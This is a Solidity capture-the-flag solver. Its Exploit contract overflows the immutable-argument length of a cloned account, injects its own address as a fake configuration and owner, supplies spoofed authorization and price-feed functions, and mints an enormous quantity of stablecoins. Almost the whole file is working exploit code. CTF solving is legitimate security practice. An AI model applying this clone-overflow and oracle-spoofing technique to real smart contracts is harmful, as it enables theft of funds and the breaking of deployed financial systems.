// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";
import "../src/Challenge.sol";
import "../src/AccountManager.sol";
import "forge-std/console.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    // configuration (address), owner (address), recovery length (uint256), immutable args length (uint16)
    uint256 private immutable EXISTING_ARGS_LENGTH = 20 + 20 + 32 + 2;
    // we need to ensure that configuration (address), owner (address) are copied
    uint256 private immutable DESIRED_ARGS_LENGTH = 20 + 20;
    // the length of an address when abi.encodePacked() in an array
    uint256 private immutable ENCODE_PACKED_ADDRESS_SIZE = 32;
    // the expected number of runtime bytes in an immutable clone
    uint256 private immutable DEFAULT_RUNTIME_CODE_LENGTH = 56;

    function exploit() external {
        Account account = AccountManager(CHALLENGE.SYSTEM_CONFIGURATION().getAccountManager()).openAccount(
            address(this),
            new address[](((DESIRED_ARGS_LENGTH + 65536) - EXISTING_ARGS_LENGTH) / ENCODE_PACKED_ADDRESS_SIZE)
        );

        uint256 deployedCodeLength = address(account).code.length;
        uint256 expectedImmutableArgsLength;
        assembly {
            extcodecopy(account, 0x00, sub(deployedCodeLength, 2), 2)
            expectedImmutableArgsLength := shr(240, mload(0x00))
        }

        uint256 existingData = deployedCodeLength - DEFAULT_RUNTIME_CODE_LENGTH;

        require(
            expectedImmutableArgsLength >= existingData + DESIRED_ARGS_LENGTH, "unlucky, not enough room for payload"
        );

        uint256 memoLength = expectedImmutableArgsLength;
        // ensure memo is padded, otherwise Solidity will do it for us
        if (memoLength % 32 != 0) {
            memoLength += 32 - memoLength % 32;
        }

        uint256 offsetToPutAddress = (memoLength + existingData) - (expectedImmutableArgsLength + 2);

        bytes memory memo = new bytes(memoLength);
        assembly {
            let memoStart := add(memo, 0x20)
            // store fake configuration
            mstore(add(add(memoStart, offsetToPutAddress), 0), shl(0x60, address()))
            // store fake owner
            mstore(add(add(memoStart, offsetToPutAddress), 20), shl(0x60, address()))
        }

        AccountManager(CHALLENGE.SYSTEM_CONFIGURATION().getAccountManager()).mintStablecoins(
            account, 1_000_000_000_001 ether, string(memo)
        );
    }

    function isAuthorized(address) external view returns (bool) {
        return true;
    }

    function getEthUsdPriceFeed() external view returns (address) {
        return address(this);
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (0, 1, 0, 0, 0);
    }

    function getCollateralRatio() external view returns (uint256) {
        return 0;
    }
}

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        Exploit exploit = new Exploit(challenge);
        exploit.exploit();

        console.log("solved?", challenge.isSolved());
    }
}
